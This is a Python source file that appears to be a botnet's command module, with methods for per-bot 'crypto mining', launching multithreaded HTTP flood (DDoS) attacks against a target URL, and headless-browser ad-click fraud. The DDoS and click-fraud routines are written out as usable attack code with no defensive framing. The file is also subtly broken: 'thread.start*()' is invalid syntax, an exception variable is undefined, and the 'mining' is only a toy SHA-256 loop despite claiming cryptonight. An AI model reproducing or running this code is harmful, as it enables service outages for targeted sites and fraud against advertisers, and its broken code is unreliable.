import threading
import requests
import time
import hashlib
import random
import logging

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from urllib.parse import quote

logger = logging.getLogger(__name__)

class SpecialCommands:
    def __init__(self):
        self.mining_processes = {}
        self.ddos_attacks = {}
        self.ad_clickers = {}
    
    def start_mining(self, bot_id, algorithm='cryptonight', intensity=50):
        def mine_crypto():
            target_hash = '0000'
            nonce = 0
            hashes = 0
            start_time = time.time()

            while bot_id in self.mining_processes:
                data = f'{bot_id}{nonce}{random.randint(0, 1000000)}'
                hash_result = hashlib.sha256(data.encode()).hexdigest()
                hashes += 1

                if hash_result.startswith(target_hash):
                    logger.info(f"Bot {bot_id} found block: {hash_result}")

                nonce += 1
                time.sleep(1 / intensity)
                
                #Logging hash rate every 30 seconds
                if time.time() - start_time > 30:
                    hashrate = hashes / (time.time() - start_time)
                    logger.info(f"Bot {bot_id} hashrate: {hashrate:.2f} H/s")
                    hashes = 0
                    start_time = time.time()

        if bot_id not in self.mining_processes:
            self.mining_processes[bot_id] = threading.Thread(target=mine_crypto)
            self.mining_processes[bot_id].start()
            return {"status": "mining_started", "algorithm": algorithm, "intesity": intensity}
        
        return {"status": 'already_mining'}
        
    def stop_mining(self, bot_id):
        if bot_id in self.mining_processes:
            del self.mining_processes[bot_id]
            return {"status": "mining stopped"}
        return {"status": "not mining"}
    
    def start_ddos(self, bot_id, target_url, duration=60, threads=10):
        def ddos_attack():
            end_time = time.time() + duration
            session = requests.Session()
            requests_sent = 0

            while time.time() < end_time and bot_id in self.ddos_attacks:
                try:
                    session.get(target_url, timeout=5)
                    session.post(target_url, data={"attack": 'ddos'}, timeout=5)
                    session.head(target_url, timeout=5)
                    requests_sent += 3
                except:
                    pass
            
            logger.info(f"Bot {bot_id} sent {requests_sent} requests to {target_url}")
        
        if bot_id not in self.ddos_attacks:
            self.ddos_attacks[bot_id] = []
            for i in range(threads):
                thread = threading.Thread(target=ddos_attack)
                thread.start()
                self.ddos_attacks[bot_id].append(thread)
            return { "status": 'ddos_started', 'target': target_url, "duration": duration}
        
        return { "status": "already_attacking"}
    
    def stop_ddos(self, bot_id):
        if bot_id in self.ddos_attacks:
            del self.ddos_attacks[bot_id]
            return {'status': "ddos_stopped"}
        return { "status": "no_active_attack"}
    
    def start_ad_clicking(self, bot_id, websites, clicks_per_site=5, delay=2):
        def click_ads():
            options = Options()
            options.add_argument('--headless')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')

            try: 
                driver = webdriver.Chrome(options=options)
                total_clicks = 0

                for website in websites:
                    try:
                        driver.get(website)
                        time.sleep(2)

                        click_selectors = [
                            'a[href*="click"]',
                            'button',
                            '.advertisement',
                            '[class*="ad"]',
                            '[id*="ad"]',
                            '.banner',
                            '[class*="banner"]',
                        ]
                        for selector in click_selectors:
                            elements = driver.find_elements(By.CSS_SELECTOR, selector)
                            for element in elements[:clicks_per_site]:
                                try: 
                                    driver.execute_script("arguments[0].click();", element)
                                    total_clicks += 1
                                    time.sleep(delay)
                                except:
                                    pass
                    except:
                        logger.error(f"Error on {website}: {e}")
                        continue
                    
                    driver.quit()
                    logger.info(f"Bot {bot_id} performed {total_clicks} ad clicks")
            except Exception as e:
                logger.error(f"Selenium error for bot {bot_id}: {e}")

        if bot_id not in self.ad_clickers:
            thread = threading.Thread(target=click_ads)
            thread.start*()
            self.ad_clickers[bot_id] = thread
            return {'status': 'ad_clicking_started', 'websites': websites}
        
        return { 'status': 'already_clicking'}